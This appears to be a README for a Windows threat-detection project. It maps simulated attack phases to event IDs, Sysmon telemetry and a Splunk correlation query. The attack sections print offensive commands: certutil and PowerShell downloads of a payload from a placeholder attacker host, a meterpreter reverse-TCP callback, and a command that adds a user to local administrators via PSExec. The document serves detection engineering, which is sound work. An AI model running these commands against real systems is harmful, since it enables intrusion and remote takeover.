# 🛡️ Windows Enterprise Attack Lifecycle Detection Framework  
## 🔐 Multi-Phase Threat Hunting & Detection Engineering Playbook

![MITRE](https://img.shields.io/badge/MITRE-Attack%20Lifecycle-red)
![Platform](https://img.shields.io/badge/Platform-Windows-orange)
![SIEM](https://img.shields.io/badge/SIEM-Splunk-green)
![Telemetry](https://img.shields.io/badge/Telemetry-Sysmon-blue)
![Status](https://img.shields.io/badge/Framework-Operational-success)

---

## 📌 Executive Summary

This project simulates a **forensic-level Windows enterprise attack lifecycle** and develops a **multi-layered detection strategy** using:

- 🖥️ Windows Security Logs  
- 📡 Sysmon Telemetry  
- 📊 Splunk SIEM  

---
## ⚔️ Offensive Tooling (Impacket & Metasploit)

The objective is to **bridge offensive techniques with defensive detection engineering**, creating **complete attack visibility** across all compromise phases.

---

## 🎯 Objectives

- ✔ Simulate real-world attacker techniques  
- ✔ Capture endpoint telemetry  
- ✔ Normalize diverse logs  
- ✔ Correlate multi-stage activity  
- ✔ Build detection-driven timelines  
- ✔ Enable proactive threat hunting  

---

## 🧪 Attack Lifecycle Overview
```
🔎 Recon → 🔑 Initial Access → 🧩 Persistence
↓
⬆ Privilege Escalation → 🔄 Lateral Movement
↓
📥 Tool Transfer → 🌐 Reverse Shell (C2)
↓
🧠 Privilege Token Abuse

```

---

## ⚔️ Phase 1: Reconnaissance & Initial Access (SMB)

Attackers begin by validating credentials and enumerating remote file shares.

---

## 💻 Attack Logic

## 🛠️ Tool Used:

```
Impacket-SMBClient
```

Command Example:

```bash
impacket-smbclient <user>:<password>@<Target_IP>

```
---
## 📡 Protocol:
```
Server Message Block (SMB)
```

---
## 🔍 Detection Signatures

- 🪪 Event ID 4624 — Successful Logon
- Logon Type 3 → Network Logon
- ✔ Remote authentication
- ✔ Credential validation
- ❌ Event ID 4625 — Failed Logon
- ⚠ Brute-force attempts
- ⚠ Password spraying

---
## ⚔️ Phase 2: Persistence & Privilege Escalation

Attackers maintain access by modifying privileged groups.

---
## 💻 Attack Logic

Command:
```cmd
net localgroup administrators <username> /add
```
Executed using:
```bash
Impacket-PSExec (SYSTEM privileges)
```

---
## 🎯 Goal:

- ✔ Persistent administrator access

---
## 🔍 Detection Signatures

|🆔 Event ID	|📄 Description |
|-------------|----------------|
|4720	|👤 User account created |
|4732	|🛡️ Added to Administrators |

---
## 🚨 High-Fidelity Alert

Monitor execution of:
```
net.exe
net1.exe
```
Modifying:
```
Administrators group
```
- ⚠ Immediate SOC investigation required.

---
## ⚔️ Phase 3: Lateral Movement & Remote Execution

Attackers move laterally using trusted Windows components.

- 💻 Attack Logic
- 🧰 WMIExec

Uses:
```
Windows Management Instrumentation (DCOM)
```
- ✔ Fileless execution
- ✔ Highly stealthy

---
## 🛠️ PSExec

Creates:
```
Temporary SYSTEM-level service
```

---
## 🔍 Detection Signatures

Monitor:
```
Event ID 4688
Sysmon Event ID 1
```
🔗 WMI Process Lineage
```
wmiprvse.exe → cmd.exe
wmiprvse.exe → powershell.exe
```
🔗 PSExec Process Lineage
```
services.exe → PSEXESVC.exe
```
Or:
```
services.exe → random_service_binary.exe
```

---
## ⚔️ Phase 4: Ingress Tool Transfer (LoLBins)

Attackers download payloads using trusted system utilities.

## 💻 Attack Logic

Payload hosted on attacker server:
```
shell.exe
```
Hosted using:
```
python3 -m http.server 80
```
- 📥 Download Methods
- 🧾 Certutil
```
certutil.exe -urlcache -split -f http://<Attacker_IP>/shell.exe shell.exe
```
- ⚡ PowerShell
```
powershell iwr -uri http://<Attacker_IP>/shell.exe -outfile shell.exe
```

---
## 🔍 Detection Signatures

Monitor:
```
certutil.exe -urlcache
```
And:
```
Invoke-WebRequest
iwr
```

---
## 🌐 Sysmon Network Detection
```
Event ID 3 → Outbound Connection
```
Triggered by:

- ✔ certutil.exe
- ✔ powershell.exe

---
## ⚔️ Phase 5: Command & Control (C2) — Reverse Shell

Payload execution establishes persistent attacker communication.

## 💻 Attack Logic

Payload:
```bash
windows/x64/meterpreter/reverse_tcp
```
Binary:
```
shell.exe
```
Connection Type:
```
Reverse TCP
```

---
## 🔍 Detection Signatures
📂 Suspicious Execution Paths
```
C:\Users\Public\
C:\Users\<User>\Desktop\
```
Temp directories

---
## 🌐 Sysmon Event ID 3 Fields
```
Image: shell.exe
DestinationIp: <Attacker_IP>
DestinationPort: 4444, 8080, 1337
```
🔗 Correlation Logic
```
Sysmon Event ID 3
        ↕
Event ID 4688
```
- ✔ Tracks execution origin
- ✔ Identifies external callbacks

---
## ⚔️ Phase 6: Privilege Token Analysis ("God Mode")

Attackers abuse SYSTEM-level privileges.

## 📂 Sensitive Privileges

Monitor:
```
Event ID 4672
Event ID 4673
```

---
## 🚨 Critical Privileges

|🔑 Privilege |	⚠ Risk |
|--------------|-----------|
|SeDebugPrivilege	|🧠 Memory access |
|SeTakeOwnershipPrivilege	|🔓 Full object control |
|SeTcbPrivilege	|🛡️ OS-level authority |

Strong indicators of:

- ✔ Credential dumping
- ✔ SYSTEM compromise

---
## 📊 Universal Splunk Detection Logic

Unified attack timeline correlation.
```spl
index=* (EventCode IN (4688, 1, 4672, 4732, 3, 4624))

| eval User = coalesce(Account_Name,
                       user,
                       TargetUserName)

| eval Process = coalesce(New_Process_Name,
                          Image,
                          process_name)

| eval Parent = coalesce(Creator_Process_Name,
                         ParentImage,
                         ParentProcessName)

| eval Remote_IP = coalesce(DestinationIp,
                            Source_Network_Address,
                            ip)

| eval Activity = case(
    EventCode==4624, "🔑 Network Logon",
    EventCode==4732, "🛡️ Admin Group Modification",
    EventCode==4688 OR EventCode==1, "⚙ Process Creation",
    EventCode==3, "🌐 External Network Callout",
    EventCode==4672, "👑 God-Mode Privilege Assigned"
)

| table _time,
         Activity,
         User,
         Process,
         Parent,
         Remote_IP,
         Privileges

| sort - _time

```

---
## 🏆 Final Architecture Summary

|⚔ Attack Phase	|🆔 Event ID	|🔍 Detection Signal	|🛡 Defense Layer |
|---------------|-------------|---------------------|-----------------|
|🔑 Initial Access	|4624	|Logon Type 3	|Identity Monitoring |
|🧩 Persistence	|4732	|Admin Group Change	|Host Security |
|🔄 Lateral Movement	|4688	|WMI/PSExec lineage	|Process Monitoring |
|📥 Tool Transfer	|Sysmon 1 	|certutil usage	|Application Control |
|🌐 C2 Callback	|Sysmon 3	|Outbound TCP	|Network Telemetry |
|👑 Privilege Escalation	|4672	|SeDebugPrivilege	|Behavioral Detection |

---
# 🧠 Key Takeaway

## 🛡️ Attackers generate chains of behavior, not isolated alerts.

Effective detection requires:

- ✔ Correlation
- ✔ Timeline reconstruction
- ✔ Behavioral analysis
- ✔ Endpoint visibility

---
## 🚀 Future Expansion

Next planned modules:

- 🧠 Credential Dumping Detection (Mimikatz)
- 🧬 LSASS Memory Monitoring
- 📅 Scheduled Task Persistence
- 📤 Data Exfiltration Detection
- 🌐 DNS Tunneling Detection

---
## 🏁 Conclusion

This project demonstrates a complete enterprise attack lifecycle detection framework, combining:

- ⚔ Offensive simulation
- 📊 Defensive telemetry
- 🔎 Threat hunting
- 🛡 Detection engineering

---
## ✍️ Author

Abhay

🔐 Detection Engineer
🧠 Threat Hunter
📊 SIEM Engineer

---
